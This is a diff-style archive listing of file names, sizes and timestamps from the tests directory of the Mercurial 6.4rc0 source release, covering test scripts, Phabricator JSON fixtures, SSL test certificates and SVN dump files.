+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1842 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/logexceptions.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      874 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/ls-l.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      907 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/md5sum.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1077 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/missing-comment.hg
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      324 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/mockblackbox.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      494 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/mockmakedate.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      400 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/mocktime.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       83 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/narrow-library.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      866 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/notcapable
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1942 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/pdiff
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.278632 mercurial-6.4rc0/tests/phabricator/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7191 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/accept-4564.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7072 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/accept-7913.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2669 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phab-conduit.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15402 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabimport-multi-drev.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    33114 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabimport-stack.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   205871 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabread-4480.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2644 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabread-conduit-error.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3689 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabread-empty-drev.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   229411 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabread-multi-drev.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   121698 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabread-str-time.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27576 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-add-parent-setup.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    49804 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-add-parent.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   152473 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-binary-renames.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    84767 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-binary.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27924 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-comment-created.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26060 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-comment-updated.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27824 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-create-alpha.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    44412 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-create-public.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    50737 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-fold-extend-end.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    57601 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-fold-extend-front.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    55187 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-fold-fold-end.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30330 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-fold-immutable.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    36865 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-fold-initial.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    37814 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-fold-no-changes.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    55587 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-fold-split-end.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    42002 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-fold-updated.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    50297 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-hash-fixes.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    57999 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-no-restack-orphan.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9076 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-skipped.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    48342 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabsend-update-alpha-create-beta.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8414 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabupdate-change-6876.json
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11184 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/phabricator/phabupdate-revs.json
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1939 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/printenv.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1443 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/printrevset.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1472 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/pullext.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      270 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/readlink.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      666 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/remotefilelog-getflogheads.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1108 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/remotefilelog-library.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1999 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/revlog-formatv0.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      537 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/revnamesext.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)   142406 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/run-tests.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      667 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/seq.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      681 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/silenttestrunner.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20194 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/simplestorerepo.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      418 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sitecustomize.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3606 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sshprotoext.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.278632 mercurial-6.4rc0/tests/sslcerts/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1824 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sslcerts/README
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1025 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sslcerts/client-cert.pem
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1679 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sslcerts/client-key-decrypted.pem
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1766 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sslcerts/client-key.pem
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1679 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sslcerts/priv.pem
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1172 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sslcerts/pub-expired.pem
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1172 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sslcerts/pub-not-yet.pem
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1172 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sslcerts/pub-other.pem
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1172 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/sslcerts/pub.pem
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.278632 mercurial-6.4rc0/tests/svn/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5686 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/branches.svndump
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1556 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/empty.svndump
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3506 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/encoding.svndump
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7715 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/move.svndump
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5119 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/replace.svndump
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2863 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/startrev.svndump
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1489 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/svndump-branches.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      866 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/svndump-empty.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1055 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/svndump-encoding.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     2316 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/svndump-move.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1496 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/svndump-replace.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      732 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/svndump-startrev.sh
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     1196 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/svndump-tags.sh
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4518 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn/tags.svndump
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      641 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svn-safe-append.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      312 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svnurlof.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1852 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/svnxml.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      873 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-abort-checkin.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      996 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-absorb-edit-lines.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6634 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-absorb-filefixupstate.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      389 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-absorb-phase.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5855 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-absorb-rename.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      662 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-absorb-strip.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      797 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-absorb-unfinished.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14017 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-absorb.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    86954 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-acl.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6650 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-add.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3884 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-addremove-similar.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1870 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-addremove.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18133 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-alias.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3679 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-amend-subrepo.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17931 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-amend.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13052 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ancestor.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1412 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-ancestor.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3805 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-annotate.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23421 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-annotate.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2610 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-arbitraryfilectx.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      665 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-archive-symlinks.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20069 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-archive.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4259 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-atomictempfile.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5098 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-audit-path.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16196 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-audit-subrepo.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7137 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-automv.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18446 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-backout.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      315 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-backwards-remove.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7260 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bad-extension.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      316 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bad-pull.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5569 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-basic.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6140 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-batching.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      360 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-batching.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5634 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bdiff.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8275 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bheads.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23161 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bisect.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20453 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bisect2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6194 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bisect3.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18291 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-blackbox.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8063 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bookflow.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6580 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bookmarks-corner-case.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5516 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bookmarks-current.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4267 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bookmarks-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    44556 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bookmarks-pushpull.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2533 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bookmarks-rebase.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1007 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bookmarks-strip.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    35122 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bookmarks.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10152 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-branch-change.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3189 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-branch-option.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1612 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-branch-tag-confict.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    44923 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-branches.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3274 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bugzilla.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8967 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bundle-phases.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7443 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bundle-r.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7084 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bundle-type.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2443 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bundle-vs-outgoing.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    31696 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bundle.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    43152 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bundle2-exchange.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    54392 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bundle2-format.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12377 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bundle2-multiple-changegroups.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2709 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bundle2-pushback.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20851 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-bundle2-remote-changegroup.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5637 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-byteify-strings.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2625 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-cache-abuse.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2586 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-cappedreader.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6940 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-casecollision-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1317 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-casecollision.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4774 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-casefolding.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2137 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-cat.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    41647 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-cbor.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15868 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-censor.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      553 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-censor2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1090 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-changelog-exec.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      353 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-cargo-lock.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      344 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-clang-format.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3619 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-code.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      808 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-commit.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1527 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-config.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      819 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-encoding.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      630 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-execute.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      282 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-format.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      930 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-help.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7070 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-interfaces.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      129 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-interfaces.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      250 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-jshint.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1628 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-module-imports.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1341 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-py3-compat.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1357 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-pyflakes.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      672 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-pylint.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      333 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-rust-format.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      868 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-check-shbang.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15236 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-chg.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3023 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-children.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6254 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-churn.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1165 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-clone-cgi.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1110 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-clone-pull-corruption.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5762 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-clone-r.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11689 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-clone-stream-format.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    28239 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-clone-stream.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3510 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-clone-update-order.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    34119 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-clone.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24618 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-clonebundles.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1903 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-close-head.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    37292 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-commandserver.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    34068 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-commit-amend.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9765 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-commit-interactive-curses.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    41248 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-commit-interactive.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3748 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-commit-multiple.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3706 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-commit-unresolved.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21377 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-commit.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2582 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-committer.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11778 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-completion.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1289 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-config-env.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      126 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-config-env.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1847 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-config-parselist.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12114 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-config.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8500 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-conflict.t
